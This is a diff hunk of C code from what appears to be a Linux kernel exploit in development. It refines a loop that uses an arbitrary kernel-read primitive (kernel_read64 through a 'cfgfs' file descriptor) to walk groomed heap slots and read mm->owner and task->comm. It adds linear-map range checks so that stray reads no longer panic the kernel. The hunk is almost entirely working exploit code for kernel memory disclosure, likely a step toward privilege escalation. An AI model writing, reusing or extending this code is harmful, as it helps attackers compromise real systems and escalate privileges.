@@ -639,11 +639,21 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
      * slots (0/16/32): mm->owner -> task->comm.  Eleven straight rounds
      * ended inuse=34 after our SIGKILL batch, so the fillers are NOT our
      * wave children -- identify them before spending more rounds.
-     * A wrong base alignment just fails the cfgfs read benignly. */
+     * HARD RULE (2026-10-21 e5d016e6 panic): cfgfs reads deref the target
+     * inside a kernel callback -- an out-of-range pointer oopses the
+     * kernel, it does NOT fail benignly.  Validate owner against the
+     * linear map before touching owner+comm. */
     for (int si = 0; si < 3; si++) {
       int slot = si * 16;
       uintptr_t mm = base + (uintptr_t)slot * MM_STRUCT_SZ;
+      if (mm < 0xffffff8000000000ULL || mm >= 0xffffffe000000000ULL)
+        continue;
       uint64_t owner = kernel_read64(conv_fd, mm + MM_OWNER_OFF);
+      if (owner < 0xffffff8000000000ULL || owner >= 0xffffffe000000000ULL) {
+        pr_info("pipe stuck slot%d mm=%016zx owner=%016llx out-of-range; "
+                "skip comm\n", slot, mm, (unsigned long long)owner);
+        continue;
+      }
       uint64_t cl = kernel_read64(conv_fd, owner + TASK_COMM_OFF);
       uint64_t ch = kernel_read64(conv_fd, owner + TASK_COMM_OFF + 8);
       pr_info("pipe stuck slot%d mm=%016zx owner=%016llx comm=%.8s%.8s\n",
